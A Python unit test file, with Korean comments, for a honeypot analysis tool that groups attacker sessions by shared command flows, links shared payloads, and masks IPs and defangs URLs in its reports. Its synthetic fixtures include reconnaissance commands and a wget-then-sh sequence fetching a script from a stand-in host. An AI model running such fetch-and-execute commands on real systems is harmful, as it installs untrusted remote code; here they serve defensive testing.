"""명령 흐름 묶음 분석 테스트. 모든 데이터는 테스트용 합성 데이터이며 실제 DB는 읽지 않는다."""
from contextlib import closing
from hashlib import sha256
import json
from pathlib import Path
import sqlite3
import tempfile
import unittest

from ml.analysis import flow_groups as F

ML_SCHEMA = """
CREATE TABLE sessions (source TEXT, session_id TEXT, sensor TEXT, src_ip TEXT, country TEXT, protocol TEXT,
    client_version TEXT, start_ts TEXT, end_ts TEXT, login_success INTEGER DEFAULT 0, username TEXT, password TEXT,
    n_commands INTEGER DEFAULT 0, n_failed INTEGER DEFAULT 0, excluded INTEGER DEFAULT 0, PRIMARY KEY (source, session_id));
CREATE TABLE commands (source TEXT, session_id TEXT, ts TEXT, command TEXT);
CREATE TABLE ml_clusters (source TEXT, session_id TEXT, protocol TEXT, model TEXT, params TEXT, cluster_id INTEGER,
    is_noise INTEGER, outlier_score REAL, probability REAL, assigned_by TEXT, assigned_at TEXT, PRIMARY KEY (source, session_id));
CREATE TABLE ml_meta (key TEXT PRIMARY KEY, value TEXT);
"""
DASH_SCHEMA = """
CREATE TABLE hits (source TEXT, session_id TEXT, rule_id TEXT, first_ts TEXT, n_hits INTEGER, PRIMARY KEY (source, session_id, rule_id));
CREATE TABLE meta (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE sources (source TEXT PRIMARY KEY, db TEXT, has_raw_logs INTEGER, first_event TEXT, last_event TEXT, imported_at TEXT, note TEXT);
"""
FILE_SCHEMA = "CREATE TABLE file_events (source TEXT, session_id TEXT, ts TEXT, kind TEXT, url TEXT, shasum TEXT, filename TEXT, error TEXT);"

SCRIPT = ["uname -a", "cat /proc/cpuinfo", "free -m", "id"]


def ip(n):
    return f"10.{n // 250}.{n % 250}.7"


def build(data_dir, sessions, file_events=None, with_file_table=True):
    """sessions: (source, sid, proto, ip, day, [commands], cluster_id, [rules])"""
    with closing(sqlite3.connect(data_dir / "ml.db")) as ml, closing(sqlite3.connect(data_dir / "dashboard.db")) as dash:
        ml.executescript(ML_SCHEMA)
        dash.executescript(DASH_SCHEMA + (FILE_SCHEMA if with_file_table else ""))
        for source, sid, proto, addr, day, cmds, cid, rules in sessions:
            ml.execute("INSERT INTO sessions (source, session_id, src_ip, protocol, start_ts, n_commands) VALUES (?,?,?,?,?,?)",
                       (source, sid, addr, proto, f"{day}T00:00:00Z", len(cmds)))
            for j, c in enumerate(cmds):
                ml.execute("INSERT INTO commands VALUES (?,?,?,?)", (source, sid, f"{day}T00:00:{j:02d}Z", c))
            ml.execute("INSERT INTO ml_clusters VALUES (?,?,?,'hdbscan','p',?,?,0,1,'fit','t')",
                       (source, sid, proto, cid, int(cid == -1)))
            for r in rules:
                dash.execute("INSERT INTO hits VALUES (?,?,?,?,1)", (source, sid, r, "t"))
        for source, sid, url, sh in file_events or []:
            dash.execute("INSERT INTO file_events VALUES (?,?,?,?,?,?,?,?)", (source, sid, "t", "download", url, sh, None, None))
        ml.executemany("INSERT INTO ml_meta VALUES (?,?)", [("trained_at", "T"), ("params", "p"), ("normalize_version", "3")])
        dash.executemany("INSERT INTO meta VALUES (?,?)", [("rules_sha256", "x"), ("rules_commit", "c"), ("built_at", "b")])
        dash.execute("INSERT INTO sources VALUES ('seoul','',1,'a','b','t','')")
        ml.commit()
        dash.commit()


def digest(path):
    return sha256(Path(path).read_bytes()).hexdigest()


class FlowGroupTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.data = Path(self.tmp.name) / "data"
        self.data.mkdir()
        self.out = Path(self.tmp.name) / "out"

    def groups(self, sessions, file_events=None, **kw):
        build(self.data, sessions, file_events)
        with closing(F.open_readonly(self.data)) as con:
            rows, _ = F.load_rows(con)
        return F.analyze(rows, **kw)

    def spread_sessions(self, n=25):
        """서로 다른 IP 25곳에서 같은 흐름 (분산)"""
        return [("seoul", f"d{i}", "telnet", ip(i), "2026-01-01", SCRIPT, 0, ["B1"]) for i in range(n)]

    def test_same_flow_is_one_group_and_protocols_are_separate(self):
        s = self.spread_sessions(3) + [("seoul", "x", "ssh", ip(90), "2026-01-01", SCRIPT, 1, []),
                                       ("seoul", "y", "ssh", ip(91), "2026-01-01", SCRIPT, 1, [])]
        groups, _, summary = self.groups(s)
        self.assertEqual(sorted((g["protocol"], g["sessions"]) for g in groups), [("ssh", 2), ("telnet", 3)])
        self.assertEqual(summary["groups"], 2)

    def test_short_flows_are_skipped(self):
        s = [("seoul", f"s{i}", "telnet", ip(i), "2026-01-01", ["sh"], 0, ["B19"]) for i in range(5)]
        groups, _, summary = self.groups(s)
        self.assertEqual(groups, [])
        self.assertEqual(summary["skipped_short"], 5)

    def test_min_sessions_filters_singletons(self):
        s = self.spread_sessions(2) + [("seoul", "solo", "telnet", ip(99), "2026-01-01", SCRIPT + ["w"], 0, [])]
        groups, _, _ = self.groups(s)
        self.assertEqual([g["sessions"] for g in groups], [2])

    def test_concentration_labels(self):
        spread = self.spread_sessions(25)                                                   # IP 25개, 점유 4%
        few = [("seoul", f"f{i}", "telnet", ip(200), "2026-01-02", SCRIPT + ["few"], 0, []) for i in range(30)]  # IP 1개
        mixed = [("seoul", f"m{i}", "telnet", ip(300 + i % 8), "2026-01-03", SCRIPT + ["mix"], 0, []) for i in range(16)]  # IP 8개
        groups, _, summary = self.groups(spread + few + mixed)
        by = {g["sessions"]: g["concentration"] for g in groups}
        self.assertEqual(by[25], F.SPREAD)
        self.assertEqual(by[30], F.FEW)
        self.assertEqual(by[16], F.MIXED)
        self.assertEqual(summary["by_concentration"][F.FEW], {"groups": 1, "sessions": 30})

    def test_group_metrics(self):
        s = [("seoul", "a", "telnet", ip(1), "2026-01-01", SCRIPT, 3, ["B1", "B2"]),
             ("syd", "b", "telnet", ip(1), "2026-01-03", SCRIPT, 3, ["B1"]),
             ("syd", "c", "telnet", ip(2), "2026-01-03", SCRIPT, -1, ["B1"])]
        g = self.groups(s)[0][0]
        self.assertEqual((g["sessions"], g["ips"], g["days"]), (3, 2, 2))
        self.assertEqual((g["first_day"], g["last_day"]), ("2026-01-01", "2026-01-03"))
        self.assertEqual(g["sources"], "seoul:1;syd:2")
        self.assertEqual(g["rules"], "B1")           # 세션의 절반 이상에 있는 규칙만
        self.assertEqual(g["top_ip_share"], round(2 / 3, 3))

    def test_payload_links_shared_by_multiple_ips(self):
        s = [("seoul", f"p{i}", "telnet", ip(i), "2026-01-01", SCRIPT, 0, []) for i in range(3)]
        fe = [("seoul", "p0", "http://203.0.113.9/a.sh", "h1"), ("seoul", "p1", "http://203.0.113.9/a.sh", "h1"),
              ("seoul", "p2", "http://127.0.0.1/x", "h2")]
        _, links, _ = self.groups(s, fe)
        kinds = {(x["kind"], x["value"]): x for x in links}
        self.assertEqual(kinds[("hash", "h1")]["ips"], 2)
        self.assertEqual(kinds[("server", "203[.]0[.]113[.]9")]["sessions"], 2)
        self.assertNotIn(("hash", "h2"), kinds)        # IP 1개만 쓴 해시는 연결이 아니다
        self.assertFalse(any("127" in x["value"] for x in links))   # 루프백 제외

    def test_missing_file_events_table_is_tolerated(self):
        build(self.data, self.spread_sessions(3), with_file_table=False)
        with closing(F.open_readonly(self.data)) as con:
            rows, has_files = F.load_rows(con)
        self.assertFalse(has_files)
        _, links, _ = F.analyze(rows)
        self.assertEqual(links, [])

    def test_outputs_have_no_full_ip_and_defang_urls(self):
        cmds = ["uname -a", "cd /tmp", "wget http://203.0.113.9/a.sh", "sh a.sh"]
        s = [("seoul", f"w{i}", "telnet", ip(i), "2026-01-01", cmds, 0, []) for i in range(3)]
        build(self.data, s)
        F.main(["--data-dir", str(self.data), "--out", str(self.out)])
        text = "".join((self.out / n).read_text(encoding="utf-8-sig") for n in ("report.md", "flow_groups.csv"))
        self.assertNotIn("10.0.0.7", text)             # ip(0) 전체 주소가 나오면 안 된다
        self.assertIn("10.0.x.x", text)
        self.assertNotIn("http://", text)
        self.assertIn("hxxp", text)
        self.assertIn("같은 행위자라는 뜻이 아니다", text)
        meta = json.loads((self.out / "run_meta.json").read_text(encoding="utf-8"))
        self.assertEqual(meta["summary"]["groups"], 1)

    def test_screen_only_fields_are_not_written_to_csv(self):
        build(self.data, self.spread_sessions(3))
        F.main(["--data-dir", str(self.data), "--out", str(self.out)])
        header = (self.out / "flow_groups.csv").read_text(encoding="utf-8-sig").splitlines()[0].split(",")
        self.assertNotIn("ips_raw", header)
        self.assertNotIn("top_ip_raw", header)
        groups, _, _ = self.groups_from_built()
        self.assertEqual(groups[0]["ips_raw"], sorted(ip(i) for i in range(3)))
        self.assertIn(groups[0]["top_ip_raw"], groups[0]["ips_raw"])

    def groups_from_built(self):
        with closing(F.open_readonly(self.data)) as con:
            rows, _ = F.load_rows(con)
        return F.analyze(rows)

    def test_originals_are_not_modified_and_connection_is_read_only(self):
        build(self.data, self.spread_sessions(3))
        before = {n: digest(self.data / n) for n in ("ml.db", "dashboard.db")}
        F.main(["--data-dir", str(self.data), "--out", str(self.out)])
        self.assertEqual(before, {n: digest(self.data / n) for n in ("ml.db", "dashboard.db")})
        self.assertEqual(sorted(p.name for p in self.data.iterdir()), ["dashboard.db", "ml.db"])
        with closing(F.open_readonly(self.data)) as con:
            with self.assertRaises(sqlite3.OperationalError):
                con.execute("DELETE FROM ml_clusters")

    def test_output_inside_data_dir_is_refused(self):
        build(self.data, self.spread_sessions(3))
        with self.assertRaises(SystemExit):
            F.main(["--data-dir", str(self.data), "--out", str(self.data / "out")])

    def test_pipe_in_command_does_not_break_report_table(self):
        s = [("seoul", f"q{i}", "telnet", ip(i), "2026-01-01", ["a|b", "c", "d", "e"], 0, []) for i in range(3)]
        build(self.data, s)
        F.main(["--data-dir", str(self.data), "--out", str(self.out)])
        line = next(l for l in (self.out / "report.md").read_text(encoding="utf-8").splitlines() if l.startswith("| 1 |"))
        self.assertEqual(line.count("|"), 11)          # 10칸 표 → 구분자 11개


if __name__ == "__main__":
    unittest.main()
